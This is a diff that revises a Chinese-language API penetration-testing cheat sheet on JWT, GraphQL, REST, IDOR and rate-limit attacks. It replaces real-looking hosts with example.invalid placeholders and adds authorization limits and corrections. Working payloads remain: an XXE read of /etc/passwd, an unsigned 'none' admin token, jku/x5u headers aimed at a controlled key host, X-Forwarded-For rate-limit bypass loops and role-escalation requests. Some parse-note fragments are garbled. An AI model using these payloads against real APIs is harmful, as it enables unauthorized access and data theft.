@@ -17,9 +17,8 @@ _JSON Web Token安全漏洞利用_
 ```
 JWT格式: header.payload.signature
 解码:
-echo "HEADER" | base64 -d
-echo "PAYLOAD" | base64 -d
-或使用jwt.io
+# HEADER/PAYLOAD 是Base64url片段，先恢复填充再离线解码；不要把占位符当作有效令牌。
+仅离线解码；不要将有效认证令牌粘贴到在线解码网站。JWT使用Base64url，需恢复填充并处理URL安全字母表，不是直接base64 -d。
 ```
 **语法解析：**
 - `header` — 算法和令牌类型 _value_
@@ -82,7 +81,7 @@ python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
 # 服务端使用Header中的JWK验证签名
 
 # JKU远程密钥集注入:
-{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
+{"alg":"RS256","typ":"JWT","jku":"https://collector.example.invalid/.well-known/jwks.json"}
 # 服务端从攻击者控制的URL获取密钥
 ```
 **语法解析：**
@@ -150,14 +149,13 @@ _GraphQL API注入与信息泄露攻击_
 /graphql.php
 
 # 发送POST请求
-curl -X POST http://target.com/graphql \
+curl -X POST https://target.example.invalid/graphql \
   -H "Content-Type: application/json" \
   -d '{"query": "{ __schema { types { name } } }"}'
 ```
 **语法解析：**
-- `<!ENTITY>` — 实体定义 _tag_
-- `SYSTEM` — 外部实体 _keyword_
-- `file://` — 文件协议 _technique_
+- `__schema` — GraphQL内省元字段 _field_
+- `query` — 请求中的GraphQL文档 _field_
 
 **2. 内省查询**
 > 执行内省查询获取API结构
@@ -186,8 +184,8 @@ curl -X POST http://target.com/graphql \
 }
 
 # 使用工具
-gqlscan -u http://target.com/graphql
-inql -t http://target.com/graphql
+gqlscan -u https://target.example.invalid/graphql
+inql -t https://target.example.invalid/graphql
 ```
 **语法解析：**
 - `__schema` — 获取整个API架构 _value_
@@ -244,7 +242,8 @@ mutation {
 # MongoDB注入
 {
   user(filter: {
-    $or: [{name: "admin"}, {name: "root"}]
+    # 无效GraphQL字段名：$or；仅作应被语法验证拒绝的负例，非可执行Mongo查询。
+    invalidOperator: "synthetic-test"
   }) {
     name
     password
@@ -319,25 +318,15 @@ query {
 **语法解析：**
 - `...on AdminUser` — GraphQL内联片段 _value_
 
-**指令注入**
-> 使用GraphQL指令绕过
-```
-# 使用指令绕过
-query {
-  user(id: 1) @deprecated {
-    name
+**条件指令验证**
+`@skip` / `@include` 控制字段是否执行，不提供授权。以下只读查询依赖目标自己的 schema；服务端仍须检查字段权限。内置 `@deprecated` 用于 schema 定义，不是查询字段的可执行指令。
+```graphql
+query ($omit: Boolean!) {
+  user(id: 1) {
+    name @skip(if: $omit)
   }
 }
-
-# 自定义指令攻击
-mutation @skip(if: false) {
-  deleteUser(id: 1)
-}
 ```
-**语法解析：**
-- `@deprecated` — 弃用指令 _value_
-- `@skip` — 条件跳过指令 _value_
-
 
 **概述：** GraphQL注入攻击利用GraphQL查询语言的灵活性进行信息泄露和数据操纵，包括深度嵌套查询(DoS)、字段建议泄露Schema信息、变量注入绕过查询限制、以及通过别名实现批量查询等。
 
@@ -501,15 +490,15 @@ fragment TypeRef on __Type {
 
 # 使用CLI工具
 npm install -g graphql-cli
-graphql-cli introspect http://target.com/graphql
+graphql-cli introspect https://target.example.invalid/graphql
 
 # InQL扫描
 pip install inql
-inql -t http://target.com/graphql
+inql -t https://target.example.invalid/graphql
 
 # GraphQL Cop
 npm install -g graphql-cop
-graphql-cop -t http://target.com/graphql
+graphql-cop -t https://target.example.invalid/graphql
 ```
 
 **WAF/EDR 绕过变体：**
@@ -521,14 +510,14 @@ graphql-cop -t http://target.com/graphql
 # 尝试不同格式
 query { __schema { types { name } } }
 query IntrospectionQuery { __schema { types { name } } }
-{"query":"{__schema{types{name}}}"
+{"query":"{__schema{types{name}}}"}
 
 # 使用GET请求
-curl "http://target.com/graphql?query={__schema{types{name}}}"
+curl --get --data-urlencode 'query={__schema{types{name}}}' "https://target.example.invalid/graphql"
 ```
 
 
-**概述：** GraphQL内省(Introspection)是GraphQL规范内置的Schema自描述功能，允许客户端查询API的完整类型系统、字段定义和参数信息。在生产环境未禁用时将泄露所有API结构信息。
+**概述：** GraphQL内省(Introspection)是GraphQL规范内置的Schema自描述功能，允许客户端查询API的完整类型系统、字段定义和参数信息。内省是规范功能；是否暴露敏感结构需结合产品策略和可见Schema判断，不应仅凭启用内省判定漏洞。
 
 **漏洞原理：** GraphQL内省通过__schema/__type查询获取：所有类型(Types)和字段(Fields)定义、查询(Query)/变更(Mutation)/订阅(Subscription)的完整接口、字段参数和返回类型、枚举值、接口和联合类型等，等同于泄露完整API文档。
 
@@ -585,7 +574,7 @@ query {
 ]
 
 # 使用curl发送
-curl -X POST http://target.com/graphql \
+curl -X POST https://target.example.invalid/graphql \
   -H "Content-Type: application/json" \
   -d '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]'
 ```
@@ -685,8 +674,8 @@ _REST API安全测试与漏洞利用_
 /redoc
 
 # 使用工具发现
-ffuf -u http://target.com/api/FUZZ -w api_endpoints.txt
-wfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ
+ffuf -u https://target.example.invalid/api/FUZZ -w api_endpoints.txt
+wfuzz -c -w api_wordlist.txt https://target.example.invalid/api/FUZZ
 ```
 **语法解析：**
 - `/api/v1/` — API版本路径 _value_
@@ -696,16 +685,16 @@ wfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ
 > 测试API认证
 ```
 # 测试未授权访问
-curl http://target.com/api/v1/users
+curl https://target.example.invalid/api/v1/users
 
 # 测试JWT
-curl -H "Authorization: Bearer TOKEN" http://target.com/api/v1/users
+curl -H "Authorization: Bearer TOKEN" https://target.example.invalid/api/v1/users
 
 # 测试API Key
-curl -H "X-API-Key: key123" http://target.com/api/v1/users
+curl -H "X-API-Key: key123" https://target.example.invalid/api/v1/users
 
 # 测试Basic Auth
-curl -u user:pass http://target.com/api/v1/users
+curl -u synthetic_test_user https://target.example.invalid/api/v1/users
 ```
 **语法解析：**
 - `Authorization: Bearer` — Bearer Token认证 _header_
@@ -715,18 +704,18 @@ curl -u user:pass http://target.com/api/v1/users
 > 测试HTTP方法
 ```
 # 测试允许的HTTP方法
-curl -X OPTIONS http://target.com/api/v1/users -v
+curl -X OPTIONS https://target.example.invalid/api/v1/users -v
 
 # 尝试PUT修改
 curl -X PUT -H "Content-Type: application/json" \
-  -d '{"name":"hacked"}' http://target.com/api/v1/users/1
+  -d '{"name":"hacked"}' https://target.example.invalid/api/v1/users/1
 
 # 尝试DELETE删除
-curl -X DELETE http://target.com/api/v1/users/1
+curl -X DELETE https://target.example.invalid/api/v1/users/1
 
 # 尝试PATCH部分更新
 curl -X PATCH -H "Content-Type: application/json" \
-  -d '{"role":"admin"}' http://target.com/api/v1/users/1
+  -d '{"role":"admin"}' https://target.example.invalid/api/v1/users/1
 ```
 **语法解析：**
 - `OPTIONS` — 获取支持的HTTP方法 _method_
@@ -757,14 +746,14 @@ curl -X PATCH -H "Content-Type: application/json" \
 > 测试内容类型处理
 ```
 # 测试不同Content-Type
-curl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" http://target.com/api/users
-curl -H "Content-Type: text/plain" -d "name=test" http://target.com/api/users
-curl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" http://target.com/api/users
+curl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" https://target.example.invalid/api/users
+curl -H "Content-Type: text/plain" -d "name=test" https://target.example.invalid/api/users
+curl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" https://target.example.invalid/api/users
 
 # XML外部实体
 curl -H "Content-Type: application/xml" \
   -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' \
-  http://target.com/api/users
+  https://target.example.invalid/api/users
 ```
 **语法解析：**
 - `Content-Type` — HTTP内容类型头 _value_
@@ -795,17 +784,17 @@ curl -H "Content-Type: application/xml" \
 > 使用编码绕过
 ```
 # URL编码
-curl http://target.com/api/users/%31  # /users/1
+curl https://target.example.invalid/api/users/%31  # /users/1
 
 # Unicode编码
-curl http://target.com/api/users/%u0031
+curl https://target.example.invalid/api/users/%u0031
 
 # 双重URL编码
-curl http://target.com/api/users/%2531
+curl https://target.example.invalid/api/users/%2531
 ```
 **语法解析：**
 - `# URL编码
-curl http://target.com/api/users/%31  # /users/1
+curl https://target.example.invalid/api/users/%31  # /users/1
 
 # Unicode编码
 curl h` — 攻击载荷 _value_
@@ -846,12 +835,10 @@ _利用JWT None算法绕过签名验证_
 **1. 解码JWT**
 > 解码JWT令牌
 ```
-# 在线解码
-https://jwt.io
+# 使用批准的离线解码器；解码不验证真实性，禁止上传真实令牌至第三方
 
 # 使用命令行
-echo "HEADER" | base64 -d
-echo "PAYLOAD" | base64 -d
+# HEADER/PAYLOAD 是Base64url片段，先恢复填充再离线解码；不要把占位符当作有效令牌。
 
 # 使用Python
 import jwt
@@ -912,10 +899,10 @@ print(token)
 > 发送恶意Token
 ```
 # 使用curl发送
-curl -H "Authorization: Bearer <MALICIOUS_TOKEN>" http://target.com/api/admin
+curl -H "Authorization: Bearer <MALICIOUS_TOKEN>" https://target.example.invalid/api/admin
 
 # 空签名测试
-curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." http://target.com/api/admin
+curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." https://target.example.invalid/api/admin
 ```
 **语法解析：**
 - `Bearer` — Bearer认证方案 _value_
@@ -1009,8 +996,9 @@ _利用JWT算法混淆实现签名绕过_
 > 获取JWT公钥
 ```
 # 从证书获取
-curl -k https://target.com/.well-known/jwks.json
+curl --fail --max-time 10 https://target.example.invalid/.well-known/jwks.json
 
+# TLS证书公钥不一定是JWT签名密钥，不能直接替代固定发行方JWKS
 # 从SSL证书获取
 echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout
 
@@ -1043,7 +1031,9 @@ public_key = open("public.pem").read()
 payload = {"sub":"admin","role":"admin"}
 
 # 使用公钥作为HMAC密钥签名
-token = jwt.encode(payload, public_key, algorithm="HS256")
+# 这是历史易受攻击验证器的概念示意；现代PyJWT拒绝把非对称PEM公钥当HMAC密钥。
+# 不提供伪称在当前库可直接工作的签名代码；先核对被测版本与密钥编码。
+# token = jwt.encode(payload, public_key, algorithm="HS256")
 print(token)
 ```
 **语法解析：**
@@ -1055,12 +1045,12 @@ print(token)
 > 发送恶意Token
 ```
 # 使用构造的Token
-curl -H "Authorization: Bearer <HS256_TOKEN>" http://target.com/api/admin
+curl -H "Authorization: Bearer <HS256_TOKEN>" https://target.example.invalid/api/admin
 
 # Python脚本
 import requests
 headers = {"Authorization": f"Bearer {token}"}
-response = requests.get("http://target.com/api/admin", headers=headers)
+response = requests.get("https://target.example.invalid/api/admin", headers=headers)
 print(response.text)
 ```
 **语法解析：**
@@ -1090,10 +1080,10 @@ print(response.text)
 > 通过jku/x5u绕过
 ```
 # jku指向攻击者服务器
-{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json"}
+{"alg":"RS256","typ":"JWT","jku":"https://collector.example.invalid/.well-known/jwks.json"}
 
 # x5u指向攻击者证书
-{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}
+{"alg":"RS256","typ":"JWT","x5u":"https://collector.example.invalid/cert.pem"}
 
 # 在攻击者服务器托管恶意密钥
 ```
@@ -1150,8 +1140,8 @@ _利用IDOR漏洞访问未授权资源_
 > 枚举ID值
 ```
 # 数字ID枚举
-for i in $(seq 1 1000); do
-  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/users/$i" >> output.txt
+for i in "$OWNED_TEST_ID_A" "$OWNED_TEST_ID_B"; do
+  curl -H "Authorization: Bearer $TOKEN" "https://target.example.invalid/api/users/$i" -o /dev/null -w "%{http_code}\n"
 done
 
 # 使用Burp Intruder
@@ -1160,7 +1150,7 @@ done
 
 # UUID枚举
 # 使用ffuf
-ffuf -u http://target.com/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bearer TOKEN"
+ffuf -u https://target.example.invalid/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bearer TOKEN"
 ```
 **语法解析：**
 - `seq 1 1000` — 生成1到1000的数字 _value_
@@ -1172,14 +1162,16 @@ ffuf -u http://target.com/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bea
 # Python脚本批量检测
 import requests
 
-token = "YOUR_TOKEN"
-for i in range(1, 100):
+import os
+token = os.environ["AUTHORIZED_TEST_TOKEN"]
+# 已批准的两个合成对象；不枚举真实用户范围。
+for i in ("owned-test-a", "owned-test-b"):
     r = requests.get(
-        f"http://target.com/api/users/{i}",
+        f"https://target.example.invalid/api/users/{i}",
         headers={"Authorization": f"Bearer {token}"}
     )
     if r.status_code == 200:
-        print(f"ID {i}: {r.json()}")
+        print(f"Test object {i}: HTTP 200; compare owner/visibility policy before reporting BOLA")
 
 # 检测数据泄露
 # 比较不同用户访问同一ID的响应
@@ -1268,7 +1260,7 @@ GET /api/orders?user_id=2  # 原本是user_id=1
 
 **防御措施：** 防御措施：
 1. 实施对象级授权检查
-2. 使用不可预测的ID(UUID)
+2. 使用不可预测的ID(UUID)作为辅助；绝不能替代对象级授权
 3. 验证用户对资源的所有权
 4. 记录异常访问模式
 5. 实施速率限制
@@ -1290,7 +1282,7 @@ _绕过API速率限制进行暴力攻击_
 ```
 # 快速发送请求检测限制
 for i in $(seq 1 100); do
-  curl -s -o /dev/null -w "%{http_code}\n" http://target.com/api/test
+  curl -s -o /dev/null -w "%{http_code}\n" https://target.example.invalid/api/test
 done
 
 # 观察响应
@@ -1306,9 +1298,9 @@ done
 > 使用IP头绕过
 ```
 # X-Forwarded-For绕过
-curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/test
-curl -H "X-Forwarded-For: 1.2.3.5" http://target.com/api/test
-curl -H "X-Forwarded-For: 1.2.3.6" http://target.com/api/test
+curl -H "X-Forwarded-For: 1.2.3.4" https://target.example.invalid/api/test
+curl -H "X-Forwarded-For: 1.2.3.5" https://target.example.invalid/api/test
+curl -H "X-Forwarded-For: 1.2.3.6" https://target.example.invalid/api/test
 
 # 其他IP头
 X-Real-IP: 1.2.3.4
@@ -1319,7 +1311,7 @@ True-Client-IP: 1.2.3.4
 
 # 自动化
 for i in $(seq 1 100); do
-  curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
+  curl -H "X-Forwarded-For: 1.2.3.$i" https://target.example.invalid/api/test
 done
 ```
 **语法解析：**
@@ -1341,7 +1333,7 @@ proxies = [
 import requests
 proxies_list = ["http://proxy1:8080", "http://proxy2:8080"]
 for i, proxy in enumerate(proxies_list):
-    requests.get("http://target.com/api/test", proxies={"http": proxy})
+    requests.get("https://target.example.invalid/api/test", proxies={"http": proxy})
 
 # 使用Tor
 # 每次请求头换Tor电路
@@ -1359,13 +1351,13 @@ import requests
 > 其他绕过技术
 ```
 # 用户代理绕过
-curl -A "Googlebot" http://target.com/api/test
-curl -A "Bingbot" http://target.com/api/test
+curl -A "Googlebot" https://target.example.invalid/api/test
+curl -A "Bingbot" https://target.example.invalid/api/test
 
 # 认证绕过
 # 使用不同账户
 for token in $TOKENS; do
-  curl -H "Authorization: Bearer $token" http://target.com/api/test
+  curl -H "Authorization: Bearer $token" https://target.example.invalid/api/test
 done
 
 # HTTP/2多路复用
@@ -1387,7 +1379,7 @@ done
 # 使用多个API Key
 api_keys = ["key1", "key2", "key3", "key4"]
 for i, key in enumerate(api_keys):
-    requests.get("http://target.com/api/test", headers={"X-API-Key": key})
+    requests.get("https://target.example.invalid/api/test", headers={"X-API-Key": key})
 
 # 注册多个账户获取多个Token
 ```
@@ -1402,7 +1394,7 @@ for i, key in enumer` — 攻击载荷 _value_
 # 添加延迟
 import time
 for i in range(100):
-    requests.get("http://target.com/api/test")
+    requests.get("https://target.example.invalid/api/test")
     time.sleep(0.5)  # 每次请求头隔0.5秒
 
 # 分散到不同时间段
@@ -1412,7 +1404,7 @@ for i in range(100):
 - `# 添加延迟
 import time
 for i in range(100):
-    requests.get("http://target.com/api/test")
+    requests.get("https://target.example.invalid/api/test")
     time.` — SQL表达式 _value_
 - `sleep` — SQL关键字 _keyword_
 - `(0.5)  # 每次请求头隔0.5秒
@@ -1653,7 +1645,7 @@ Authorization: Bearer user_a_token
 # 用户B尝试访问
 GET /api/documents/doc_123
 Authorization: Bearer user_b_token
-# 如果返回200，存在BOLA
+# HTTP 200本身不证明BOLA；验证私有合成对象是否真的被未授权B读取/修改，排除公开资源或错误包装。
 ```
 **语法解析：**
 - `POST` — HTTP方法 _method_
@@ -1664,7 +1656,7 @@ Authorization: Bearer user_b_token
 ```
 # 枚举其他用户资源
 for doc_id in doc_1 doc_2 doc_3; do
-  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/documents/$doc_id"
+  curl -H "Authorization: Bearer $TOKEN" "https://target.example.invalid/api/documents/$doc_id"
 done
 
 # 访问其他用户私有数据
@@ -1914,7 +1906,7 @@ id=1+` — SQL表达式 _value_
 - `", "1=1"]}` — SQL表达式 _value_
 
 
-**概述：** API注入攻击将传统的注入技术(SQL/NoSQL/OS命令/LDAP等)应用于API接口，JSON/XML格式的输入参数、查询字符串、HTTP头等都可能成为注入点，且API通常缺少Web应用的WAF防护。
+**概述：** API注入攻击将传统的注入技术(SQL/NoSQL/OS命令/LDAP等)应用于API接口，JSON/XML格式的输入参数、查询字符串、HTTP头等都可能成为注入点，且是否部署WAF取决于架构；WAF不是注入缺陷的根因或授权控制。
 
 **漏洞原理：** API注入攻击面：1)JSON参数中的SQL/NoSQL注入 2)GraphQL查询变量中的注入 3)API网关/中间件的头注入(Host/X-Forwarded-For) 4)文件名/路径参数的命令注入 5)LDAP/XPATH查询参数注入 6)API响应中的XSS(存储型)。
 
@@ -1933,3 +1925,13 @@ id=1+` — SQL表达式 _value_
 5. WAF防护
 
 ---
+
+## 验证与执行边界
+
+本页路由、对象、账户及令牌均为实验占位符；不因HTTP 200、Schema内省、可预测ID或接收某字段就宣称漏洞。使用两个已批准的合成账户和可恢复测试资源，对照预期的对象/字段/功能授权策略。写入、删除、密码/角色变更、计费及邮件短信调用必须单独纳入顶层 SKILL.md 的逐命令确认和回滚范围；禁止默认枚举导出真实用户数据。
+
+JWT alg 值区分大小写；None/NONE只是错误实现负例，支持标准none不等于应用接受无签名认证。验证器固定算法、可信发行方/密钥、iss/aud/exp/nbf与所需声明；不信任令牌自带jku/x5u/x5c。PyJWT无签名解码只能观察内容。GraphQL数组batch、字段名/JSON scalar和CLI依赖实现；关闭内省不是授权替代，@skip/@deprecated不绕过规范校验或resolver授权。
+
+端点发现、批量登录/OTP及IP头/代理/多账户测试需明确请求数、速率、成本/锁定上限与停止条件；收到429/Retry-After按约定停止，不擅自申请新账户或切换身份扩大预算。Python网络片段未提供完整错误/响应大小/重试处理，需补全后使用；真实凭据通过非回显输入或秘密存储注入，不使用示例值。
+
+参考：[GraphQL内省](https://graphql.org/learn/introspection/)、[PyJWT API](https://pyjwt.readthedocs.io/en/stable/api.html)、[OWASP BOLA](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/)。未执行任何载荷或认证请求。
